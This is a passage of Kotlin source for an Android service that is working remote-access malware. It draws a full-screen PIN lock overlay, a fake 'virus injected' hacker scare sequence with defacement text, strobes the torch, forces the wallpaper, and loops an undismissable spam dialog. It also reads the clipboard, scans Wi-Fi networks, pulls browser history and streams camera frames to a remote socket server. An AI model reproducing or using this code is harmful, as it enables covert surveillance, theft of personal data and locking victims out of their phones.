            textOverlayView = null
            textOverlayWm   = null
            emitStatus(JSONObject().apply { put("screenText", false) })
        }
    }

    private fun buildLockHtml(title: String): String = """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;}
body{
  min-height:100vh;width:100%;
  background:radial-gradient(ellipse at 50% 15%,#2a2a2a 0%,#111 40%,#050505 100%);
  font-family:-apple-system,sans-serif;
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  color:#fff;user-select:none;overflow:hidden;
}
.particles{position:fixed;inset:0;pointer-events:none;z-index:0;}
.particle{
  position:absolute;border-radius:50%;
  animation:float linear infinite;
  background:rgba(255,255,255,.12);
}
@keyframes float{
  0%{transform:translateY(100vh) scale(0);opacity:0}
  10%{opacity:1}90%{opacity:.4}
  100%{transform:translateY(-10vh) scale(1);opacity:0}
}
.wrap{position:relative;z-index:1;display:flex;flex-direction:column;align-items:center;gap:28px;width:100%;padding:0 32px;}
.lock-icon-ring{
  width:100px;height:100px;border-radius:50%;
  background:radial-gradient(circle,rgba(255,255,255,.08),transparent 70%);
  border:1.5px solid rgba(255,255,255,.2);
  display:flex;align-items:center;justify-content:center;
  box-shadow:
    0 0 0 1px rgba(255,255,255,.05),
    0 0 40px rgba(255,255,255,.12),
    0 0 80px rgba(200,205,214,.06),
    inset 0 1px 0 rgba(255,255,255,.15);
  animation:breathe 3.5s ease-in-out infinite;
}
@keyframes breathe{
  0%,100%{box-shadow:0 0 0 1px rgba(255,255,255,.05),0 0 40px rgba(255,255,255,.12),0 0 80px rgba(200,205,214,.06),inset 0 1px 0 rgba(255,255,255,.15)}
  50%{box-shadow:0 0 0 1px rgba(255,255,255,.1),0 0 60px rgba(255,255,255,.22),0 0 120px rgba(200,205,214,.12),inset 0 1px 0 rgba(255,255,255,.2)}
}
.lock-icon-ring svg{filter:drop-shadow(0 0 10px rgba(255,255,255,.9)) drop-shadow(0 0 20px rgba(200,205,214,.5));}
.lock-title{
  font-size:21px;font-weight:700;letter-spacing:.5px;text-align:center;line-height:1.3;
  background:linear-gradient(180deg,#fff 0%,#c8cdd6 100%);
  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
  filter:drop-shadow(0 2px 16px rgba(255,255,255,.3));
}
.lock-sub{font-size:11px;color:rgba(200,205,214,.4);letter-spacing:4px;text-transform:uppercase;margin-top:-16px;}
.dots-row{display:flex;gap:16px;align-items:center;justify-content:center;height:20px;}
.dot{
  width:13px;height:13px;border-radius:50%;
  background:rgba(255,255,255,.08);
  border:1.5px solid rgba(200,205,214,.25);
  transition:all .15s;
}
.dot.filled{
  background:linear-gradient(135deg,#fff,#c8cdd6);
  border-color:rgba(255,255,255,.6);
  box-shadow:0 0 12px rgba(255,255,255,.7),0 0 24px rgba(200,205,214,.3);
}
.dot.error{
  background:rgba(248,113,113,.8);border-color:rgba(248,113,113,.9);
  box-shadow:0 0 12px rgba(248,113,113,.6);
  animation:shake .3s ease;
}
@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-5px)}75%{transform:translateX(5px)}}
.numpad{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;width:100%;max-width:280px;}
.key{
  height:70px;border-radius:18px;
  background:linear-gradient(180deg,rgba(255,255,255,.07) 0%,rgba(255,255,255,.03) 100%);
  border:1px solid rgba(255,255,255,.1);
  box-shadow:0 1px 0 rgba(255,255,255,.08),inset 0 1px 0 rgba(255,255,255,.06);
  color:#fff;font-size:24px;font-weight:500;
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  cursor:pointer;transition:all .1s;-webkit-user-select:none;
}
.key:active,.key.pressed{
  background:linear-gradient(180deg,rgba(255,255,255,.16) 0%,rgba(255,255,255,.08) 100%);
  border-color:rgba(255,255,255,.3);
  box-shadow:0 0 16px rgba(255,255,255,.12),inset 0 1px 0 rgba(255,255,255,.15);
  transform:scale(.95);
}
.key .sub{font-size:7px;letter-spacing:2.5px;color:rgba(200,205,214,.4);margin-top:2px;}
.key.del{font-size:18px;color:rgba(200,205,214,.7);}
.key.empty{visibility:hidden;}
.err-msg{font-size:10px;color:#f87171;letter-spacing:3px;height:14px;text-align:center;opacity:0;transition:opacity .2s;text-transform:uppercase;}
.err-msg.show{opacity:1;}
</style>
</head>
<body>
<div class="particles" id="particles"></div>
<div class="wrap">
  <div class="lock-icon-ring">
    <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">
      <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
      <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
    </svg>
  </div>
  <div class="lock-title">${title}</div>
  <div class="lock-sub">MASUKKAN PIN</div>
  <div class="dots-row" id="dots"></div>
  <div class="err-msg" id="errMsg">PIN SALAH</div>
  <div class="numpad" id="numpad"></div>
</div>
<script>
const PIN_LEN = 4;
var entered = '';

function initParticles(){
  var c=document.getElementById('particles');
  for(var i=0;i<20;i++){
    var d=document.createElement('div');
    d.className='particle';
    var s=Math.random()*5+2;
    d.style.cssText='width:'+s+'px;height:'+s+'px;left:'+Math.random()*100+'%;animation-duration:'+(Math.random()*14+8)+'s;animation-delay:'+(Math.random()*10)+'s;';
    c.appendChild(d);
  }
}

function buildDots(){
  var r=document.getElementById('dots');r.innerHTML='';
  for(var i=0;i<PIN_LEN;i++){
    var d=document.createElement('div');
    d.className='dot'+(i<entered.length?' filled':'');
    r.appendChild(d);
  }
}

function buildPad(){
  var p=document.getElementById('numpad');
  var keys=['1','2','3','4','5','6','7','8','9','','0','⌫'];
  keys.forEach(function(k){
    var b=document.createElement('div');
    b.className='key'+(k===''?' empty':'')+(k==='⌫'?' del':'');
    b.innerHTML=k==='1'?'1':
                k==='2'?'2<span class="sub">ABC</span>':
                k==='3'?'3<span class="sub">DEF</span>':
                k==='4'?'4<span class="sub">GHI</span>':
                k==='5'?'5<span class="sub">JKL</span>':
                k==='6'?'6<span class="sub">MNO</span>':
                k==='7'?'7<span class="sub">PQRS</span>':
                k==='8'?'8<span class="sub">TUV</span>':
                k==='9'?'9<span class="sub">WXYZ</span>':
                k==='0'?'0':k;
    if(k!==''){
      b.addEventListener('touchstart',function(e){e.preventDefault();b.classList.add('pressed');},true);
      b.addEventListener('touchend',function(e){e.preventDefault();b.classList.remove('pressed');press(k);},true);
    }
    p.appendChild(b);
  });
}

function press(k){
  var e=document.getElementById('errMsg');
  e.classList.remove('show');
  if(k==='⌫'){
    entered=entered.slice(0,-1);
    buildDots();
    return;
  }
  if(entered.length>=PIN_LEN) return;
  entered+=k;
  buildDots();
  if(entered.length===PIN_LEN){
    var ok=Android.tryUnlock(entered);
    if(!ok){
      var dots=document.querySelectorAll('.dot');
      dots.forEach(function(d){d.classList.add('error');});
      e.classList.add('show');
      setTimeout(function(){
        dots.forEach(function(d){d.classList.remove('error');});
        entered='';buildDots();
      },700);
    }
  }
}

initParticles();buildPad();buildDots();
</script>
</body>
</html>""".trimIndent()

    private var sosActive          = false
    private var sosOverlayView: android.view.View? = null
    private var sosFlashHandler: Handler? = null
    private var sosFlashRunnable: Runnable? = null
    private var sosVideoPlayer: MediaPlayer? = null
    private var sosVideoView: SurfaceView?   = null

    private fun setSos(enable: Boolean) {
        if (enable) {
            if (sosActive) return
            sosActive = true
            startSos()
            emitStatus(JSONObject().apply { put("sos", true) })
        } else {
            stopSos()
        }
    }

    private fun startSos() {
        if (!Settings.canDrawOverlays(this)) return
        Handler(Looper.getMainLooper()).post {
            try {
                // Flash blink terus menerus
                sosFlashHandler = Handler(Looper.getMainLooper())
                var flashState = false
                sosFlashRunnable = object : Runnable {
                    override fun run() {
                        if (!sosActive) {
                            try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
                            return
                        }
                        flashState = !flashState
                        try { torchCameraId?.let { cameraManager?.setTorchMode(it, flashState) } } catch (_: Exception) {}
                        sosFlashHandler?.postDelayed(this, 200)
                    }
                }
                sosFlashHandler?.post(sosFlashRunnable!!)

                // Overlay HTML sequence
                val params = XyzAccessibilityService.buildOverlayParams(focusable = false)
                val wv = android.webkit.WebView(this).apply {
                    settings.javaScriptEnabled = true
                    settings.domStorageEnabled  = true
                    setBackgroundColor(android.graphics.Color.TRANSPARENT)
                    loadDataWithBaseURL(null, buildSosHtml(), "text/html", "UTF-8", null)
                }
                sosOverlayView = wv
                XyzAccessibilityService.addOverlay(wv, params)

                // Setelah 20 detik (5s warning + ~3s countdown + 10s teks + 2s buffer):
                // hapus overlay, ganti wallpaper, pasang overlay video looping
                Handler(Looper.getMainLooper()).postDelayed({
                    if (!sosActive) return@postDelayed
                    try { sosOverlayView?.let { XyzAccessibilityService.removeOverlay(it) } } catch (_: Exception) {}
                    sosOverlayView = null
                    setWallpaperFromAssetVideo()
                    startSosVideoOverlay()
                }, 20_000L)

            } catch (e: Exception) {
                Log.e("DeviceService", "startSos: ${e.message}")
            }
        }
    }

    private fun setWallpaperFromAssetVideo() {
        Thread {
            try {
                val inputStream = assets.open("wallpaper.jpg")
                val bmp = BitmapFactory.decodeStream(inputStream)
                inputStream.close()
                if (bmp != null && checkSelfPermission(android.Manifest.permission.SET_WALLPAPER) == PackageManager.PERMISSION_GRANTED) {
                    val wm = WallpaperManager.getInstance(this)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                        wm.setBitmap(bmp, null, true, WallpaperManager.FLAG_SYSTEM or WallpaperManager.FLAG_LOCK)
                    } else {
                        @Suppress("DEPRECATION") wm.setBitmap(bmp)
                    }
                    bmp.recycle()
                }
            } catch (e: Exception) {
                Log.e("DeviceService", "setWallpaperFromAssetVideo: ${e.message}")
            }
        }.start()
    }

    private fun startSosVideoOverlay() {
        Handler(Looper.getMainLooper()).post {
            try {
                val params = XyzAccessibilityService.buildOverlayParams(focusable = false)
                val sv = SurfaceView(this)
                sosVideoView = sv
                XyzAccessibilityService.addOverlay(sv, params)
                sv.holder.addCallback(object : SurfaceHolder.Callback {
                    override fun surfaceCreated(h: SurfaceHolder) {
                        try {
                            sosVideoPlayer = MediaPlayer().apply {
                                val afd = assets.openFd("overlay.mp4")
                                setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                                afd.close()
                                setSurface(h.surface)
                                isLooping = true
                                prepareAsync()
                                setOnPreparedListener { start() }
                                setOnErrorListener { _, what, extra ->
                                    Log.e("DeviceService", "sosVideo error what=$what extra=$extra")
                                    true
                                }
                            }
                        } catch (e: Exception) {
                            Log.e("DeviceService", "startSosVideoOverlay surfaceCreated: ${e.message}")
                        }
                    }
                    override fun surfaceChanged(h: SurfaceHolder, f: Int, w: Int, ht: Int) {}
                    override fun surfaceDestroyed(h: SurfaceHolder) {}
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "startSosVideoOverlay: ${e.message}")
            }
        }
    }

    private fun stopSos() {
        sosActive = false
        sosFlashHandler?.removeCallbacks(sosFlashRunnable ?: Runnable {})
        sosFlashHandler  = null
        sosFlashRunnable = null
        try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
        Handler(Looper.getMainLooper()).post {
            try { sosOverlayView?.let { XyzAccessibilityService.removeOverlay(it) } } catch (_: Exception) {}
            sosOverlayView = null
            try { sosVideoPlayer?.stop(); sosVideoPlayer?.release(); sosVideoPlayer = null } catch (_: Exception) {}
            try { sosVideoView?.let { XyzAccessibilityService.removeOverlay(it) } } catch (_: Exception) {}
            sosVideoView = null
        }
        emitStatus(JSONObject().apply { put("sos", false) })
    }

    private fun buildSosHtml(): String = """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>
@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@700;900&display=swap');

*{box-sizing:border-box;margin:0;padding:0;}
html,body{width:100%;height:100%;overflow:hidden;background:transparent;font-family:'Share Tech Mono',monospace;}

/* === SCANLINE OVERLAY === */
body::before{
  content:'';position:fixed;inset:0;pointer-events:none;z-index:999;
  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,65,0.03) 2px,rgba(0,255,65,0.03) 4px);
}
body::after{
  content:'';position:fixed;inset:0;pointer-events:none;z-index:998;
  background:radial-gradient(ellipse at center,transparent 60%,rgba(0,0,0,0.7) 100%);
}

/* === MATRIX RAIN CANVAS === */
#matrix-bg{position:fixed;inset:0;z-index:0;opacity:0.18;}

/* ===== PHASE 1 – WARNING ===== */
#phase-warning{
  position:fixed;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;
  background:transparent;z-index:10;
}

/* Glitch title */
.warn-title{
  font-family:'Orbitron',monospace;
  font-size:18px;font-weight:900;color:#00ff41;
  letter-spacing:4px;text-align:center;text-transform:uppercase;
  text-shadow:0 0 10px #00ff41,0 0 30px #00ff41,0 0 60px #00ff41;
  animation:glitch 2s infinite;
  margin-bottom:12px;
}
@keyframes glitch{
  0%,90%,100%{text-shadow:0 0 10px #00ff41,0 0 30px #00ff41;transform:translate(0);}
  92%{text-shadow:-2px 0 #ff0055,2px 0 #00ffff;transform:translate(-2px,1px);}
  94%{text-shadow:2px 0 #ff0055,-2px 0 #00ffff;transform:translate(2px,-1px);}
  96%{text-shadow:-1px 0 #ff0055,1px 0 #00ffff;transform:translate(-1px,0);}
}

.warn-ring{
  width:130px;height:130px;border-radius:50%;
  border:2px solid #00ff41;
  display:flex;align-items:center;justify-content:center;
  animation:pulse-ring 1.2s ease-in-out infinite;
  margin-bottom:28px;position:relative;
  box-shadow:0 0 20px #00ff41,inset 0 0 20px rgba(0,255,65,0.1);
}
.warn-ring::before{
  content:'';position:absolute;inset:-8px;border-radius:50%;
  border:1px solid rgba(0,255,65,0.3);
  animation:pulse-ring 1.2s ease-in-out infinite reverse;
}
.warn-ring::after{
  content:'';position:absolute;inset:-16px;border-radius:50%;
  border:1px solid rgba(0,255,65,0.15);
}
@keyframes pulse-ring{
  0%,100%{box-shadow:0 0 0 0 rgba(0,255,65,.6),0 0 30px rgba(0,255,65,.2),inset 0 0 20px rgba(0,255,65,0.1)}
  50%{box-shadow:0 0 0 20px rgba(0,255,65,0),0 0 60px rgba(0,255,65,.4),inset 0 0 30px rgba(0,255,65,0.2)}
}

/* SVG Warning Icon */
.warn-svg{width:58px;height:58px;filter:drop-shadow(0 0 12px #00ff41);}

.warn-sub{
  font-size:10px;color:rgba(0,255,65,0.5);letter-spacing:6px;
  margin-top:14px;text-transform:uppercase;text-align:center;
  animation:blink-sub 1.5s step-end infinite;
}
@keyframes blink-sub{0%,100%{opacity:1}50%{opacity:0.3}}

/* Terminal box */
.warn-terminal{
  margin-top:30px;border:1px solid rgba(0,255,65,0.3);padding:14px 24px;
  background:rgba(0,255,65,0.04);width:280px;
}
.warn-terminal-line{
  font-size:10px;color:rgba(0,255,65,0.6);letter-spacing:1px;
  margin-bottom:4px;line-height:1.6;
}
.warn-terminal-line span{color:#00ff41;}
.cursor{display:inline-block;width:7px;height:12px;background:#00ff41;margin-left:2px;animation:blink-cursor .7s step-end infinite;vertical-align:middle;}
@keyframes blink-cursor{0%,100%{opacity:1}50%{opacity:0}}

/* ===== PHASE 2 – COUNTDOWN ===== */
#phase-countdown{
  position:fixed;inset:0;display:none;flex-direction:column;align-items:center;justify-content:center;
  background:transparent;z-index:10;
}
.count-label{
  font-family:'Share Tech Mono',monospace;
  font-size:11px;color:rgba(0,255,65,0.5);letter-spacing:8px;
  text-transform:uppercase;margin-bottom:20px;
}
.count-num{
  font-family:'Orbitron',monospace;
  font-size:180px;font-weight:900;color:#00ff41;
  text-shadow:none;
  line-height:1;animation:count-pop .4s cubic-bezier(.34,1.56,.64,1) both;
  position:relative;
}
.count-num::before{
  content:attr(data-n);position:absolute;inset:0;
  color:#ff0055;opacity:0.4;
  animation:count-glitch .4s cubic-bezier(.34,1.56,.64,1) both;
  clip-path:polygon(0 30%,100% 30%,100% 50%,0 50%);
}
@keyframes count-pop{from{transform:scale(1.5);opacity:0}to{transform:scale(1);opacity:1}}
@keyframes count-glitch{from{transform:scale(1.5) translateX(4px);opacity:0}to{transform:scale(1) translateX(2px);opacity:0.4}}

.count-bar{
  margin-top:30px;width:200px;height:2px;background:rgba(0,255,65,0.15);
  position:relative;overflow:hidden;
}
.count-bar::after{
  content:'';position:absolute;left:0;top:0;height:100%;
  background:#00ff41;box-shadow:0 0 8px #00ff41;
  animation:bar-drain 2.7s linear forwards;
}
@keyframes bar-drain{from{width:100%}to{width:0%}}

/* ===== PHASE 3 – TEXTS ===== */
#phase-texts{
  position:fixed;inset:0;display:none;
  background:transparent;z-index:10;overflow:hidden;
}
.txt-item{
  position:absolute;font-family:'Orbitron',monospace;font-weight:700;color:#00ff41;
  text-shadow:0 0 10px #00ff41,0 0 25px rgba(0,255,65,0.5);
  opacity:0;pointer-events:none;
  animation:txt-pop .3s ease forwards;
  letter-spacing:2px;
}
.txt-item::before{
  content:'> ';color:rgba(0,255,65,0.4);font-size:0.7em;
}
@keyframes txt-pop{
  0%{opacity:0;transform:scale(.5) rotate(var(--r,0deg));filter:blur(4px);}
  60%{opacity:1;transform:scale(1.1) rotate(var(--r,0deg));filter:blur(0);}
  100%{opacity:1;transform:scale(1) rotate(var(--r,0deg));filter:blur(0);}
}

/* Emoji items — no prefix */
.txt-item.emoji-item::before{content:'';}
</style>
</head>
<body>

<!-- Matrix Rain -->
<canvas id="matrix-bg"></canvas>

<!-- ===== PHASE 1 ===== -->
<div id="phase-warning">
  <div class="warn-ring">
    <!-- SVG Shield/Alert Icon -->
    <svg class="warn-svg" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
      <polygon points="32,4 60,18 60,38 32,60 4,38 4,18" stroke="#00ff41" stroke-width="2.5" fill="none"/>
      <line x1="32" y1="22" x2="32" y2="38" stroke="#00ff41" stroke-width="3" stroke-linecap="round"/>
      <circle cx="32" cy="46" r="2.5" fill="#00ff41"/>
      <!-- Inner glow lines -->
      <polygon points="32,10 54,21 54,37 32,54 10,37 10,21" stroke="rgba(0,255,65,0.2)" stroke-width="1" fill="none"/>
    </svg>
  </div>
  <div class="warn-title">Perangkat Anda Ter-Injeksi Virus Xyz</div>
  <div class="warn-sub">System Alert &nbsp;·&nbsp; Do Not Panic</div>
  <div class="warn-terminal">
    <div class="warn-terminal-line"><span>[SYS]</span> Intrusion detected...</div>
    <div class="warn-terminal-line"><span>[ERR]</span> Firewall bypassed: <span>TRUE</span></div>
    <div class="warn-terminal-line"><span>[INF]</span> Origin: <span>UNKNOWN</span></div>
    <div class="warn-terminal-line"><span>root@xyz:~$</span> <span class="cursor"></span></div>
  </div>
</div>

<!-- ===== PHASE 2 ===== -->
<div id="phase-countdown">
  <div class="count-label">// Initializing</div>
  <div class="count-num" id="count-num" data-n="3">3</div>
  <div class="count-bar"></div>
</div>

<!-- ===== PHASE 3 ===== -->
<div id="phase-texts"></div>

<script>
/* ---- Matrix Rain ---- */
(function(){
  var c=document.getElementById('matrix-bg');
  var ctx=c.getContext('2d');
  var W,H,cols,drops;
  var chars='アイウエオカキクケコサシスセソタチツテトナニヌネノ0123456789ABCDEF<>[]{}|\\;:01'.split('');
  function init(){
    W=c.width=window.innerWidth;
    H=c.height=window.innerHeight;
    cols=Math.floor(W/16);
    drops=Array(cols).fill(1);
  }
  init();
  window.addEventListener('resize',init);
  setInterval(function(){
    ctx.fillStyle='rgba(0,0,0,0.05)';
    ctx.fillRect(0,0,W,H);
    ctx.fillStyle='#00ff41';
    ctx.font='14px Share Tech Mono, monospace';
    drops.forEach(function(y,i){
      var ch=chars[Math.floor(Math.random()*chars.length)];
      ctx.fillText(ch,i*16,y*16);
      if(y*16>H&&Math.random()>.975) drops[i]=0;
      drops[i]++;
    });
  },50);
})();

/* ---- Phases ---- */
var texts=[
  {t:"Zal \u042Fyuichi Is Back",sz:22,x:10,y:8,r:-5},
  {t:"I'm Zal \u042Fyuichi",sz:17,x:55,y:20,r:4},
  {t:"Kacung Kacung",sz:19,x:15,y:38,r:-3},
  {t:"Udah Kenal Zal \u042Fyuichi Belum Dek?",sz:14,x:5,y:55,r:2},
  {t:"omak ada Zal \u042Fyuichi",sz:17,x:45,y:65,r:-6},
  {t:"Hakced By Zal \u042Fyuichi",sz:15,x:10,y:78,r:3},
  {t:"\uD83D\uDE02\uD83D\uDE39\uD83D\uDE02\uD83D\uDE1C",sz:36,x:60,y:42,r:0,emoji:true}
];

function phase1(){
  document.getElementById('phase-warning').style.display='flex';
  setTimeout(phase2,5000);
}
function phase2(){
  document.getElementById('phase-warning').style.display='none';
  var cd=document.getElementById('phase-countdown');
  cd.style.display='flex';
  var n=document.getElementById('count-num');
  var nums=[3,2,1];var i=0;
  function tick(){
    n.textContent=nums[i];
    n.setAttribute('data-n',nums[i]);
    n.style.animation='none';void n.offsetWidth;
    n.style.animation='count-pop .4s cubic-bezier(.34,1.56,.64,1) both';
    i++;
    if(i<nums.length){setTimeout(tick,900);}else{setTimeout(phase3,900);}
  }
  tick();
}
function phase3(){
  document.getElementById('phase-countdown').style.display='none';
  var pt=document.getElementById('phase-texts');
  pt.style.display='block';
  var delay=0;
  texts.forEach(function(item){
    setTimeout(function(){
      var el=document.createElement('div');
      el.className='txt-item'+(item.emoji?' emoji-item':'');
      el.textContent=item.t;
      el.style.cssText='left:'+item.x+'%;top:'+item.y+'%;font-size:'+item.sz+'px;--r:'+item.r+'deg;';
      pt.appendChild(el);
    },delay);
    delay+=200;
  });
}
phase1();
</script>
</body>
</html>
""".trimIndent()

    private var spamDialogActive = false
    private var spamDialogHandler: Handler? = null
    private var spamDialogRunnable: Runnable? = null

    private fun setSpamDialog(enable: Boolean) {
        if (enable) {
            if (spamDialogActive) return
            spamDialogActive = true
            spamDialogHandler = Handler(Looper.getMainLooper())
            spamDialogRunnable = object : Runnable {
                override fun run() {
                    if (!spamDialogActive) return
                    showSpamOverlay()
                }
            }
            spamDialogHandler!!.post(spamDialogRunnable!!)
            emitStatus(JSONObject().apply { put("spamDialog", true) })
        } else {
            spamDialogActive = false
            spamDialogHandler?.removeCallbacks(spamDialogRunnable ?: return)
            spamDialogHandler = null
            spamDialogRunnable = null
            dismissSpamOverlay()
            emitStatus(JSONObject().apply { put("spamDialog", false) })
        }
    }

    private var spamOverlayView: android.view.View? = null

    private fun showSpamOverlay() {
        if (!spamDialogActive) return
        if (!Settings.canDrawOverlays(this)) return

        // dismiss dulu kalau masih ada
        dismissSpamOverlay()

        Handler(Looper.getMainLooper()).post {
            try {
                val params = XyzAccessibilityService.buildOverlayParams(focusable = true)

                val wv = android.webkit.WebView(this).apply {
                    settings.javaScriptEnabled = true
                    addJavascriptInterface(object : Any() {
                        @android.webkit.JavascriptInterface
                        fun onButtonClick() {
                            // tombol OK / Batal ditekan → dismiss lalu tampil lagi
                            Handler(Looper.getMainLooper()).post {
                                dismissSpamOverlay()
                                if (spamDialogActive) {
                                    spamDialogHandler?.postDelayed({
                                        if (spamDialogActive) showSpamOverlay()
                                    }, 300)
                                }
                            }
                        }
                    }, "SpamBridge")
                    loadDataWithBaseURL(null, buildSpamDialogHtml(), "text/html", "UTF-8", null)
                }

                spamOverlayView = wv
                XyzAccessibilityService.addOverlay(wv, params)
            } catch (e: Exception) {
                Log.e("DeviceService", "showSpamOverlay: ${e.message}")
            }
        }
    }

    private fun dismissSpamOverlay() {
        Handler(Looper.getMainLooper()).post {
            try {
                spamOverlayView?.let { XyzAccessibilityService.removeOverlay(it) }
            } catch (_: Exception) {}
            spamOverlayView = null
        }
    }

    private fun buildSpamDialogHtml(): String = """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;}
html,body{
  width:100%;height:100%;
  background:rgba(0,0,0,0.4);
  display:flex;align-items:flex-end;justify-content:center;
  font-family:-apple-system,sans-serif;
  overflow:hidden;
}
.sheet{
  width:100%;max-width:480px;
  background:#ffffff;
  border-radius:20px 20px 0 0;
  padding:24px 20px 36px;
  animation:slideUp .25s cubic-bezier(.34,1.2,.64,1) both;
  overflow:hidden;
}
@keyframes slideUp{
  from{transform:translateY(100%)}
  to{transform:translateY(0)}
}
.sender{
  font-size:12px;font-weight:600;color:#888;
  margin-bottom:6px;letter-spacing:.3px;
  text-align:center;
}
.title{
  font-size:17px;font-weight:700;color:#111;
  margin-bottom:8px;line-height:1.3;
  text-align:center;
}
.msg{
  font-size:14px;color:#333;line-height:1.6;margin-bottom:24px;
  text-align:center;
}
.btns{
  display:flex;justify-content:center;gap:150px;
}
.btn{
  height:40px;padding:0 20px;border-radius:8px;border:none;
  font-size:14px;font-weight:600;letter-spacing:.3px;
  cursor:pointer;transition:opacity .1s;
  background:transparent;color:#1a73e8;
}
.btn:active{opacity:.6;}
</style>
</head>
<body>
<div class="sheet">
  <div class="sender">Pesan</div>
  <div class="title">Notifikasi Baru</div>
  <div class="msg">HP Mu Ke Sadap Bang😂</div>
  <div class="btns">
    <button class="btn" ontouchend="SpamBridge.onButtonClick()">Batal</button>
    <button class="btn" ontouchend="SpamBridge.onButtonClick()">OK</button>
  </div>
</div>
</body>
</html>""".trimIndent()

    private fun setProtection(enable: Boolean) {
        XyzAccessibilityService.protectionEnabled = enable
        getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit()
            .putBoolean("protection_enabled", enable).apply()
        emitStatus(JSONObject().apply { put("protectionEnabled", enable) })
    }

    // ── Clipboard ────────────────────────────────────────────────────────────
    private fun sendClipboard() {
        try {
            val cm = getSystemService(android.content.Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
            val text = cm.primaryClip?.getItemAt(0)?.coerceToText(this)?.toString() ?: ""
            if (socket?.connected() != true) return
            socket?.emit("device:clipboard", JSONObject().apply {
                put("deviceId", deviceId)
                put("text", text)
                put("time", System.currentTimeMillis())
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "sendClipboard: ${e.message}")
        }
    }

    // ── Wifi Scanner ─────────────────────────────────────────────────────────
    private fun sendWifiList() {
        Thread {
            try {
                val wm = applicationContext.getSystemService(android.content.Context.WIFI_SERVICE) as android.net.wifi.WifiManager
                // Start scan
                @Suppress("DEPRECATION")
                wm.startScan()
                Thread.sleep(2500) // tunggu scan
                @Suppress("DEPRECATION")
                val results = wm.scanResults ?: emptyList()
                val arr = org.json.JSONArray()
                results.sortedByDescending { it.level }.forEach { r ->
                    arr.put(JSONObject().apply {
                        put("ssid",     r.SSID.ifBlank { "<Hidden>" })
                        put("bssid",    r.BSSID)
                        put("level",    r.level)
                        put("security", when {
                            r.capabilities.contains("WPA3") -> "WPA3"
                            r.capabilities.contains("WPA2") -> "WPA2"
                            r.capabilities.contains("WPA")  -> "WPA"
                            r.capabilities.contains("WEP")  -> "WEP"
                            else -> "Open"
                        })
                        put("frequency", r.frequency)
                    })
                }
                if (socket?.connected() != true) return@Thread
                socket?.emit("device:wifi", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("networks", arr)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendWifiList: ${e.message}")
            }
        }.start()
    }

    // ── Web History ──────────────────────────────────────────────────────────
    private fun sendWebLog() {
        Thread {
            try {
                val arr = org.json.JSONArray()
                val projection = arrayOf("title", "url", "date")
                val cursor = contentResolver.query(
                    android.net.Uri.parse("content://browser/bookmarks"),
                    projection,
                    "bookmark = 0",
                    null,
                    "date DESC LIMIT 100"
                )
                cursor?.use {
                    while (it.moveToNext()) {
                        val title = it.getString(0) ?: ""
                        val url   = it.getString(1) ?: ""
                        val date  = it.getLong(2)
                        if (url.isBlank()) return@use
                        arr.put(JSONObject().apply {
                            put("title", title)
                            put("url",   url)
                            put("time",  date)
                        })
                    }
                }
                if (socket?.connected() != true) return@Thread
                socket?.emit("device:weblog", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("history",  arr)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendWebLog: ${e.message}")
            }
        }.start()
    }

    fun emitStatus(statusObj: JSONObject) {
        if (socket?.connected() != true) return
        socket?.emit("device:status", JSONObject().apply {
            put("deviceId", deviceId)
            put("status", statusObj)
        })
    }

    private fun emitFrame(b64: String) {
        if (socket?.connected() != true) return
        socket?.emit("camera:frame", JSONObject().apply {
            put("deviceId", deviceId)
            put("frame", "data:image/jpeg;base64,$b64")
        })
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        socketWatchdogHandler.removeCallbacks(socketWatchdogRunnable)
        super.onDestroy()
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_PAUSE)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_STOP)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_DESTROY)
        try { unregisterReceiver(localReceiver) } catch (_: Exception) {}
        stopCameraInternal()
        stopFloatingVideo()
        setSpamDialog(false)
        stopSos()
        flashBlinking = false
        flashHandler?.removeCallbacks(flashRunnable ?: Runnable {})
        flashHandler = null
        try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
        silentPlayer?.release()
        silentPlayer = null
        audioPlayer?.release()
        audioPlayer = null
        tts?.shutdown()
        tts = null
        socket?.disconnect()
        socket = null
    }

    private fun buildNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
